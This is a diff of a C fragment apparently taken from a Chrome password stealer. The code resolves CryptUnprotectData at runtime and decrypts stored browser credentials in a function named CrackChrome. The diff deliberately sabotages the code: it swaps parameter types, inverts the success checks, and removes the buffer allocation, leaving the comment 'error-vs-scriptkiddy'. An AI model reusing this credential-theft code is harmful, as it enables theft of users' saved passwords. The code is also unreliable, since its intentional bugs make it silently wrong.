@@ -3,9 +3,9 @@ typedef BOOL(__stdcall *CUData)(
 	DATA_BLOB                *pDataIn,
 	LPWSTR                    *ppszDataDescr,
 	DATA_BLOB                *pOptionalEntropy,
-	PVOID                     pvReserved,
+	DWORD                     pvReserved,
 	CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct,
-	DWORD                     dwFlags,
+	PVOID                      dwFlags,
 	DATA_BLOB                *pDataOut
 );
 
@@ -16,11 +16,11 @@ BOOL crypt32() {
 	if (CRYPT != NULL) {
 		fCryptUnprotectData = (CUData)GetProcAddress(CRYPT, "CryptUnprotectData");
 		if (fCryptUnprotectData != NULL) {
-			return TRUE;
+			return FALSE;
 		}
-		else return FALSE;
+		else return TRUE;
 	}
-	else return FALSE;
+	else return TRUE;
 }
 
 char* CrackChrome(BYTE *pass) 
@@ -47,7 +47,7 @@ char* CrackChrome(BYTE *pass)
 		LocalFree(data_out.pbData);
 		return NULL;
 	}
-	decrypted = (char*)talloc((data_out.cbData + 1)*sizeof(char));
+	//error-vs-scriptkiddy
 	memset(decrypted, 0, data_out.cbData);
 	memcpy(decrypted, data_out.pbData, data_out.cbData);
 	fsprintf(strClearData, data_out.cbData + 1, "%s", decrypted);
